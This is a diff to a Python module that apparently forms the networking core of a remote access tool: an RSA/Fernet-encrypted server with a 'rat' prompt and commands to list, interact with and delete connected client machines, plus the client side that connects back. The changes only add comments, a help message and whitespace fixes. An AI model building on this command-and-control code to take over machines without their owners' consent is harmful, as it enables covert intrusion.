@@ -23,7 +23,7 @@ class Socket:
   def send(self, message, as_bytes=False):
     if as_bytes==False:
       message=str(message).encode('utf-8')
-    # split message in a list of packets with max size SEND_MSG_LEN
+    # split message into a list of packets with max size SEND_MSG_LEN
     packs=[]
     while len(message) > SEND_MSG_LEN:
       packs.append(message[:SEND_MSG_LEN])
@@ -35,7 +35,7 @@ class Socket:
       msg=self.key.encrypt(pack)
       self.connection.send(msg)
       sleep(0.1)
-    self.connection.send(self.key.encrypt(b'/'))
+    self.connection.send(self.key.encrypt(b'/')) # sending EOF "/"
 
   def receive(self, as_bytes=False):
     # get packets one by one until getting '/' to terminate
@@ -79,7 +79,7 @@ class Socket:
 class Server(Socket):
   def __init__(self, handle, host="127.0.0.1", port=62832):
     super(Server, self).__init__(host, port)
-    
+
     self.handle=handle
     self.running=False
     self.public_key, self.private_key = rsa.newkeys(2048)
@@ -88,15 +88,22 @@ class Server(Socket):
     self.sock.listen()
     print(f"[*] Listening on {port}...")
   
-  def wait_for_clients(self):
+  def wait_for_clients(self): # multithreading
     self.clients=[]
     id_cli=1
     while self.running:
       try:
+        """
+        1 sending rsa public key to client
+        2 client sends encrypted symetric key
+        3 decrypt symetric key
+        4 talk with the same symetric key
+        """
         client, addr=self.sock.accept()
         client.send(self.public_key.save_pkcs1())
         client_key=Fernet(rsa.decrypt(client.recv(2048), self.private_key))
         
+        # add client to clients list
         self.clients.append({
           'connection':client,
           'key':client_key,
@@ -123,7 +130,7 @@ class Server(Socket):
         self.connection.close()
         return
 
-  def use(self, client):
+  def use(self, client): # run commands to use the specified client
     self.connection=client['connection']
     self.key=client['key']
     name=client['name']
@@ -132,7 +139,7 @@ class Server(Socket):
       cmd=input(f" rat {name} > ")
       using=self.handle(self, cmd)
 
-  def interact(self, name):
+  def interact(self, name): # search for given client and use it
     for client in self.clients:
       if (not client['ended']) and client['name']==name:
         self.use(client)
@@ -141,6 +148,7 @@ class Server(Socket):
 
   def run(self):
     self.running=True
+    # starting main thread
     self.waitcli=threading.Thread(target=self.wait_for_clients)
     self.waitcli.start()
     exited=False
@@ -153,9 +161,16 @@ class Server(Socket):
         self.delete(cmd.split(' ')[1])
       elif cmd.split(' ')[0] == 'interact' and len(cmd.split(' '))>1:
         self.interact(cmd.split(' ')[1])
+      else:
+        print("""
+sessions : prints all connected clients
+interact : use the specified client
+delete   : delete the specified client
+""")
   
   def stop(self):
     self.running=False
+    # join all subprocesses and end
     if self.waitcli:
       self.waitcli.join()
     for client in self.clients:
@@ -171,6 +186,12 @@ class Client(Socket):
     self.sock.connect((host, port))
     self.connection=self.sock
     self.connected = True
+    """
+    1 getting server rsa public key
+    2 generate symetric key
+    3 send it encrypted to server
+    4 talk with the same symetric key
+    """
     
     connection_key=rsa.PublicKey.load_pkcs1(self.connection.recv(2048))
     key = Fernet.generate_key()
